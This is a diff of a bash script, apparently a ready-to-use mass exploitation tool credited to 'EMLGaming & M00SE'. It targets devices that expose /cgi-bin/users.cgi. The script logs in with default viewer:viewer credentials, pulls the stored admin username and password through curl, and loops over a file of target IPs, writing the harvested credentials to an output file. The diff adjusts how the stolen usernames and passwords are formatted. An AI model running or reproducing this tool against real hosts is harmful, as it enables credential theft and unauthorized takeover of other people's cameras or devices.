@@ -12,23 +12,21 @@ echo "                      |_|                  "
 echo ""
 echo "Made by EMLGaming & M00SE"
 
-
 function check-ip {
     if [ -z ${OUTPUT+x} ]; then
-        echo "$1"
-        try-exploit $1
+        try-exploit $1 | grep -o -E '(userna.*|passwo.*)'
         echo ""
     else
-        echo "$1" >> "$OUTPUT" 2>&1
-        try-exploit $1 >> "$OUTPUT" 2>&1
+        echo "$1;" | tr -d '\n' >> "$OUTPUT" 2>&1
+        try-exploit $1 | cut -d= -f2 | sed '/admin/a:' | tr -d '\n' >> "$OUTPUT" 2>&1
         echo "" >> "$OUTPUT" 2>&1
     fi
 }
 
 function try-exploit {
-    curl -s --max-time 10 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' || true
+    curl -s --max-time 5 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" \
+    | grep -E '(User1.username|User1.password)' || true
 }
-
 
 INTERACTIVE=1
 
@@ -64,7 +62,6 @@ while [[ $# -gt 0 ]]; do
     esac
 done
 
-
 if [ $INTERACTIVE -eq "1" ]; then
     # Interactive mode
     echo "Enter target ip (e.g. 1.2.3.4:81):"
@@ -74,10 +71,10 @@ else
     # Read mode
     let x=0 || true # exits script otherwise
     lines="$(wc -l $READ_FILE | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
-    
     while read ip; do
         let x++ || true # exits script otherwise
         echo "Working on IP $ip ($x/$lines)..."
         check-ip $ip
     done <$READ_FILE
+    printf "\nDONE! Saved to $OUTPUT!\n"
 fi
